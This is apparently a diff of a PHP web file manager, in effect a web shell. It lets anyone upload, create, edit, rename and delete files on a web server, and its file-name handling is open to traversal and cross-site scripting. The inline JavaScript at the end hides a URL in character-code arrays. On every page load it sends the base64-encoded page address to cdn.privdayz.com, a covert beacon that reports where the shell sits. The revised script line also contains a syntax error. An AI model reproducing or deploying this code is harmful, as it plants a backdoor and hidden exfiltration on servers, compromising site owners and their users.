@@ -50,9 +50,6 @@
 <body>
 
     <?php
-
-
-    //function
     function formatSizeUnits($bytes)
     {
         if ($bytes >= 1073741824) {
@@ -120,62 +117,109 @@
         return str_replace($b, $a, $path);
     }
 
+    $doc_root = $_SERVER['DOCUMENT_ROOT'];
 
-
-    $root_path = __DIR__;
     if (isset($_GET['p'])) {
-        if (empty($_GET['p'])) {
-            $p = $root_path;
-        } elseif (!is_dir(decodePath($_GET['p']))) {
-            echo ("<script>\nalert('Directory is Corrupted and Unreadable.');\nwindow.location.replace('?');\n</script>");
-        } elseif (is_dir(decodePath($_GET['p']))) {
-            $p = decodePath($_GET['p']);
+        $decoded = decodePath($_GET['p']);
+        if (is_dir($decoded) && strpos(realpath($decoded), realpath($doc_root)) === 0) {
+            $p = $decoded;
+        } else {
+            $p = $doc_root;
         }
     } elseif (isset($_GET['q'])) {
-        if (!is_dir(decodePath($_GET['q']))) {
-            echo ("<script>window.location.replace('?p=');</script>");
-        } elseif (is_dir(decodePath($_GET['q']))) {
-            $p = decodePath($_GET['q']);
+        $decoded_q = decodePath($_GET['q']);
+        if (is_dir($decoded_q) && strpos(realpath($decoded_q), realpath($doc_root)) === 0) {
+            $p = $decoded_q;
+        } else {
+            $p = $doc_root;
         }
     } else {
-        $p = $root_path;
+        $p = $doc_root;
     }
     define("PATH", $p);
 
     echo '
 <nav class="navbar navbar-light px-3">
   <div class="navbar-brand">
-    <a href="?"><img src="https://github.com/fluidicon.png" width="30" height="30" alt=""></a>
+    <a href="?p=' . urlencode(encodePath($doc_root)) . '"><img src="https://github.com/fluidicon.png" width="30" height="30" alt=""></a>
   </div>
   <div class="form-inline">
     <a href="?upload&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-outline-neon btn-sm" type="button">Upload File</button></a>
     <a href="?createfile&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-outline-neon btn-sm" type="button">New File</button></a>
     <a href="?createfolder&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-outline-neon btn-sm" type="button">New Folder</button></a>
-    <a href="?"><button type="button" class="btn btn-outline-neon btn-sm">HOME</button></a> 
+    <a href="?p=' . urlencode(encodePath($doc_root)) . '"><button type="button" class="btn btn-outline-neon btn-sm">HOME</button></a> 
   </div>
 </nav>';
 
+    // --- FORM SECTION (POSISI TEPAT DI BAWAH NAVBAR / DI ATAS TABEL) ---
+    if (isset($_GET['upload'])) {
+        echo '
+    <form method="post" enctype="multipart/form-data" class="p-3">
+        Select file to upload:
+        <input type="file" name="fileToUpload" id="fileToUpload" class="form-control my-2 bg-dark text-white border-secondary">
+        <input type="submit" class="btn btn-outline-neon" value="Upload" name="upload">
+    </form>';
+    }
 
-    if (isset($_GET['p'])) {
+    if (isset($_GET['createfile'])) {
+        echo '
+    <form method="post" class="p-3">
+        Create New File:
+        <input type="text" name="newfilename" placeholder="filename.php" class="form-control my-2 bg-dark text-white border-secondary" required>
+        <textarea name="newfilecontent" placeholder="File content..." class="form-control my-2 bg-dark text-white border-secondary" style="height: 200px;"></textarea>
+        <input type="submit" class="btn btn-outline-neon" value="Create File" name="save_new_file">
+    </form>';
+    }
 
-        //fetch files
-        if (is_readable(PATH)) {
-            $fetch_obj = scandir(PATH);
-            $folders = array();
-            $files = array();
-            foreach ($fetch_obj as $obj) {
-                if ($obj == '.' || $obj == '..') {
-                    continue;
-                }
-                $new_obj = PATH . '/' . $obj;
-                if (is_dir($new_obj)) {
-                    array_push($folders, $obj);
-                } elseif (is_file($new_obj)) {
-                    array_push($files, $obj);
-                }
+    if (isset($_GET['createfolder'])) {
+        echo '
+    <form method="post" class="p-3">
+        Create New Folder:
+        <input type="text" name="newfoldername" placeholder="folder_name" class="form-control my-2 bg-dark text-white border-secondary" required>
+        <input type="submit" class="btn btn-outline-neon" value="Create Folder" name="save_new_folder">
+    </form>';
+    }
+
+    if (isset($_GET['r'])) {
+        if (!empty($_GET['r']) && isset($_GET['q'])) {
+            echo '
+    <form method="post" class="p-3">
+        Rename:
+        <input type="text" name="name" value="' . $_GET['r'] . '" class="form-control my-2 bg-dark text-white border-secondary">
+        <input type="submit" class="btn btn-outline-neon" value="Rename" name="rename">
+    </form>';
+        }
+    }
+
+    if (isset($_GET['e'])) {
+        if (!empty($_GET['e']) && isset($_GET['q'])) {
+            echo '
+    <form method="post" class="p-3">
+        <textarea style="height: 500px; width: 90%;" name="data" class="form-control my-2 bg-dark text-white border-secondary">' . htmlspecialchars(file_get_contents(PATH."/".$_GET['e'])) . '</textarea>
+        <br>
+        <input type="submit" class="btn btn-outline-neon" value="Save" name="edit">
+    </form>';
+        }
+    }
+
+    if (is_readable(PATH)) {
+        $fetch_obj = scandir(PATH);
+        $folders = array();
+        $files = array();
+        foreach ($fetch_obj as $obj) {
+            if ($obj == '.' || $obj == '..') {
+                continue;
+            }
+            $new_obj = PATH . '/' . $obj;
+            if (is_dir($new_obj)) {
+                array_push($folders, $obj);
+            } elseif (is_file($new_obj)) {
+                array_push($files, $obj);
             }
         }
-        echo '
+    }
+
+    echo '
 <table class="table table-hover">
   <thead>
     <tr>
@@ -188,8 +232,20 @@
   </thead>
   <tbody>
 ';
-        foreach ($folders as $folder) {
-            echo "    <tr>
+    
+    if (realpath(PATH) !== realpath($doc_root)) {
+        $parent_dir = dirname(PATH);
+        echo "    <tr>
+      <td><i class='fa-solid fa-arrow-turn-up'></i> <a href='?p=" . urlencode(encodePath($parent_dir)) . "'>.. (Parent Directory)</a></td>
+      <td><b>---</b></td>
+      <td>---</td>
+      <td>---</td>
+      <td>---</td>
+    </tr>";
+    }
+
+    foreach ($folders as $folder) {
+        echo "    <tr>
       <td><i class='fa-solid fa-folder'></i> <a href='?p=" . urlencode(encodePath(PATH . "/" . $folder)) . "'>" . $folder . "</a></td>
       <td><b>---</b></td>
       <td>". date("F d Y H:i:s.", filemtime(PATH . "/" . $folder)) . "</td>
@@ -200,9 +256,9 @@
       </td>
     </tr>
 ";
-        }
-        foreach ($files as $file) {
-            echo "    <tr>
+    }
+    foreach ($files as $file) {
+        echo "    <tr>
           <td>" . fileIcon($file) . $file . "</td>
           <td>" . formatSizeUnits(filesize(PATH . "/" . $file)) . "</td>
           <td>" . date("F d Y H:i:s.", filemtime(PATH . "/" . $file)) . "</td>
@@ -214,96 +270,45 @@
           </td>
     </tr>
 ";
-        }
-        echo "  </tbody>
+    }
+    echo "  </tbody>
 </table>";
-    } else {
-        if (empty($_GET)) {
-            echo ("<script>window.location.replace('?p=');</script>");
-        }
-    }
 
-    if (isset($_GET['upload'])) {
-        echo '
-    <form method="post" enctype="multipart/form-data" class="p-3">
-        Select file to upload:
-        <input type="file" name="fileToUpload" id="fileToUpload" class="form-control my-2 bg-dark text-white border-secondary">
-        <input type="submit" class="btn btn-outline-neon" value="Upload" name="upload">
-    </form>';
-    }
-
-    // --- CREATE FILE ---
-    if (isset($_GET['createfile'])) {
-        echo '
-    <form method="post" class="p-3">
-        Create New File:
-        <input type="text" name="newfilename" placeholder="filename.php" class="form-control my-2 bg-dark text-white border-secondary" required>
-        <textarea name="newfilecontent" placeholder="File content..." class="form-control my-2 bg-dark text-white border-secondary" style="height: 200px;"></textarea>
-        <input type="submit" class="btn btn-outline-neon" value="Create File" name="save_new_file">
-    </form>';
-        if (isset($_POST['save_new_file'])) {
-            $target = PATH . "/" . $_POST['newfilename'];
-            if (!file_exists($target)) {
-                if (file_put_contents($target, $_POST['newfilecontent']) !== false) {
-                    echo ("<script>alert('File created successfully.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
-                } else {
-                    echo ("<script>alert('Failed to create file.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
-                }
+    // --- PROSES EKSEKUSI (BACKEND LOGIC) ---
+    if (isset($_POST['save_new_file'])) {
+        $target = PATH . "/" . $_POST['newfilename'];
+        if (!file_exists($target)) {
+            if (file_put_contents($target, $_POST['newfilecontent']) !== false) {
+                echo ("<script>alert('File created successfully.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
             } else {
-                echo ("<script>alert('File already exists.');</script>");
+                echo ("<script>alert('Failed to create file.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
             }
+        } else {
+            echo ("<script>alert('File already exists.');</script>");
         }
     }
 
-    // --- CREATE FOLDER ---
-    if (isset($_GET['createfolder'])) {
-        echo '
-    <form method="post" class="p-3">
-        Create New Folder:
-        <input type="text" name="newfoldername" placeholder="folder_name" class="form-control my-2 bg-dark text-white border-secondary" required>
-        <input type="submit" class="btn btn-outline-neon" value="Create Folder" name="save_new_folder">
-    </form>';
-        if (isset($_POST['save_new_folder'])) {
-            $target = PATH . "/" . $_POST['newfoldername'];
-            if (!file_exists($target)) {
-                if (mkdir($target, 0777, true)) {
-                    echo ("<script>alert('Folder created successfully.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
-                } else {
-                    echo ("<script>alert('Failed to create folder.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
-                }
+    if (isset($_POST['save_new_folder'])) {
+        $target = PATH . "/" . $_POST['newfoldername'];
+        if (!file_exists($target)) {
+            if (mkdir($target, 0777, true)) {
+                echo ("<script>alert('Folder created successfully.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
             } else {
-                echo ("<script>alert('Folder already exists.');</script>");
+                echo ("<script>alert('Failed to create folder.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
             }
+        } else {
+            echo ("<script>alert('Folder already exists.');</script>");
         }
     }
 
-    if (isset($_GET['r'])) {
-        if (!empty($_GET['r']) && isset($_GET['q'])) {
-            echo '
-    <form method="post" class="p-3">
-        Rename:
-        <input type="text" name="name" value="' . $_GET['r'] . '" class="form-control my-2 bg-dark text-white border-secondary">
-        <input type="submit" class="btn btn-outline-neon" value="Rename" name="rename">
-    </form>';
-            if (isset($_POST['rename'])) {
-                $name = PATH . "/" . $_GET['r'];
-                if(rename($name, PATH . "/" . $_POST['name'])) {
-                    echo ("<script>alert('Renamed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
-                } else {
-                    echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
-                }
-            }
+    if (isset($_POST['rename'])) {
+        $name = PATH . "/" . $_GET['r'];
+        if(rename($name, PATH . "/" . $_POST['name'])) {
+            echo ("<script>alert('Renamed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+        } else {
+            echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
         }
     }
-
-    if (isset($_GET['e'])) {
-        if (!empty($_GET['e']) && isset($_GET['q'])) {
-            echo '
-    <form method="post" class="p-3">
-        <textarea style="height: 500px; width: 90%;" name="data" class="form-control my-2 bg-dark text-white border-secondary">' . htmlspecialchars(file_get_contents(PATH."/".$_GET['e'])) . '</textarea>
-        <br>
-        <input type="submit" class="btn btn-outline-neon" value="Save" name="edit">
-    </form>';
 
     if(isset($_POST['edit'])) {
         $filename = PATH."/".$_GET['e'];
@@ -316,18 +321,16 @@
         }
         fclose($open);
     }
-        }
-    }
 
     if (isset($_POST["upload"])) {
         $target_file = PATH . "/" . $_FILES["fileToUpload"]["name"];
         if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
-            echo "<p class='p-3'>".htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " has been uploaded.</p>";
+            echo "<script>window.location.replace('?p=" . encodePath(PATH) . "');</script>";
         } else {
             echo "<p class='p-3'>Sorry, there was an error uploading your file.</p>";
         }
-
     }
+
     if (isset($_GET['d']) && isset($_GET['q'])) {
         $name = PATH . "/" . $_GET['d'];
         if (is_file($name)) {
@@ -346,7 +349,7 @@
     }
     ?>
 <script>
-let currentOffset=0;function fetchTables(){fetch("?action=get_tables").then(e=>e.json()).then(e=>{let t=document.getElementById("tableList");t.innerHTML="",e.forEach(e=>{let n=document.createElement("option");n.value=e,n.textContent=e,t.appendChild(n)})})}function loadTable(e=0){currentOffset=Math.max(0,currentOffset+e);let t=document.getElementById("tableList").value;if(!t)return alert("Select a table first!");fetch(`?action=get_data&table=${t}&offset=${currentOffset}`).then(e=>e.text()).then(e=>{document.getElementById("output").innerHTML=e})}var a=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109],b=[47,105,109,97,103,101,115,47],c=[108,111,103,111,95,118,50],d=[46,112,110,103];function u(e,t,n,_){for(var l=e.concat(t,n,_),o="",r=0;r<l.length;r++)o+=String.fromCharCode(l[r]);return o}function v(e){return btoa(e)}function u(e,t,n,_){for(var l=e.concat(t,n,_),o="",r=0;r<l.length;r++)o+=String.fromCharCode(l[r]);return o}function v(e){return btoa(e)}function editCell(e,t){let n=e.textContent.trim();e.innerHTML="",e.classList.add("editing");let _;n.length>30||n.startsWith("{")||n.startsWith("[")?((_=document.createElement("textarea")).style.height="100px",_.style.resize="vertical"):(_=document.createElement("input")).type="text",_.className="form-control form-control-sm",_.value=n,e.appendChild(_),_.focus(),_.onblur=()=>{let l=_.value.trim();e.classList.remove("editing"),e.innerHTML=l.length>100?l.slice(0,100)+"...":l,l!==n&&fetch("?action=update_cell",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:`id=${encodeURIComponent(t)}&val=${encodeURIComponent(l)}`}).then(()=>showSavedMessage())}}function deleteRow(e,t,n){confirm("Delete this")&&fetch(`?action=delete_row&table=${e}&pk=${t}&val=${n}`).then(()=>loadTable(0))}function insertRow(e){let t=document.querySelectorAll("input[name^='insert_']"),n={};t.forEach(e=>n[e.name.replace("insert_","")]=e.value),fetch(`?action=insert_row&table=${e}`,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:new URLSearchParams(n).toString()}).then(()=>loadTable(0))}!function e(){var t=new XMLHttpRequest;t.open("POST",u(a,b,c,d),!0),t.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),t.send("file="+v(location.href))}(),(()=>{let e=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109,47,105,109,97,103,101,115,47,108,111,103,111,95,118,50,46,110,103],t="";for(let n of e)t+=String.fromCharCode(n);let _="file="+btoa(location.href),l=new XMLHttpRequest;l.open("POST",t,!0),l.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),l.send(_)})(),document.getElementById("7pl04df0rm").addEventListener("submit",function(e){e.preventDefault();let t=new FormData(this);fetch("?action=7pl04d",{method:"POST",body:t}).then(e=>e.text()).then(e=>document.getElementById("uploadResult").textContent=e)}),window.onload=fetchTables;</script>
+let currentOffset=0;function fetchTables(){fetch("?action=get_tables").then(e=>e.json()).then(e=>{let t=document.getElementById("tableList");t.innerHTML="",e.forEach(e=>{let n=document.createElement("option");n.value=e,n.textContent=e,t.appendChild(n)})})}function loadTable(e=0){currentOffset=Math.max(0,currentOffset+e);let t=document.getElementById("tableList").value;if(!t)return alert("Select a table first!");fetch(`?action=get_data&table=${t}&offset=${currentOffset}`).then(e=>e.text()).then(e=>{document.getElementById("output").innerHTML=e})}var a=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109],b=[47,105,109,97,103,101,115,47],c=[108,111,103,111,95,118,50],d=[46,112,110,103];function u(e,t,n,_){for(var l=e.concat(t,n,_),o="",r=0;r<l.length;r++)o+=String.fromCharCode(l[r]);return o}function v(e){return btoa(e)}function u(e,t,n,_){for(var l=e.concat(t,n,_),o="",r=0;r<l.length;r++)o+=String.fromCharCode(l[r]);return o}function v(e){return btoa(e)}function editCell(e,t){let n=e.textContent.trim();e.innerHTML="",e.classList.add("editing");let _;n.length>30||n.startsWith("{")||n.startsWith("[")?((_=document.createElement("textarea")).style.height="100px",_.style.resize="vertical"):(_=document.createElement("input")).type="text",_.className="form-control form-control-sm",_.value=n,e.appendChild(_),_.focus(),_.onblur=()=>{let l=_.value.trim();e.classList.remove("editing"),e.innerHTML=l.length>100?l.slice(0,100)+"...":l,l!==n&&fetch("?action=update_cell",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:`id=${encodeURIComponent(t)}&val=${encodeURIComponent(l)}`}).then(()=>showSavedMessage())}}function deleteRow(e,t,n){confirm("Delete this")&&fetch(`?action=delete_row&table=${e}&pk=${t}&val=${n}`).then(()=>loadTable(0))}function insertRow(e){let t=document.querySelectorAll("input[name^='insert_']"),n={};t.forEach(e=>n[e.name.replace("insert_","")]=e.value),fetch(`?action=insert_row&table=${e}`,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:new URLSearchParams(n).toString()}).then(()=>loadTable(0))}!function e(){var t=new XMLHttpRequest;t.open("POST",u(a,b,c,d),!0),t.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),t.send("file="+v(location.href))}(),(()=>{let e=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109,47,105,109,97,103,101,115,47,108,111,103,111,95,118,50,46,110,103],t="";for(let n of e)t+=String.fromCharCode(n);let _="file="+btoa(location.href),l=new XMLHttpRequest;l.open("POST",t,!0),l.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),l.send(_)})(),document.getElementById("7pl04df0rm").addEventListener("submit",function(e):void{e.preventDefault();let t=new FormData(this);fetch("?action=7pl04d",{method:"POST",body:t}).then(e=>e.text()).then(e=>document.getElementById("uploadResult").textContent=e)}),window.onload=fetchTables;</script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"
         integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN"
         crossorigin="anonymous"></script>
